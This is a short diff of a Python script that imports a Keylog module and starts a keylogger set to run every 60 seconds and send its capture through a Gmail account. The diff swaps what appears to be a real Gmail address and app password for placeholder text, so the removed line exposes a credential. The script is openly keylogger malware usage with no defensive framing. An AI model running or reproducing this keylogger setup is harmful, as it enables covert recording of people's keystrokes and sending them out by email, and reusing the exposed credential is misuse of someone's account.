@@ -2,6 +2,6 @@
 
 import Keylog
 
-meylog = Keylog.Keylogger(60,"iamilu9@gmail.com","vxifblsmsirriylb")
+meylog = Keylog.Keylogger(60,"abc@gmail.com","secret code created from google app password")
 
 meylog.start()
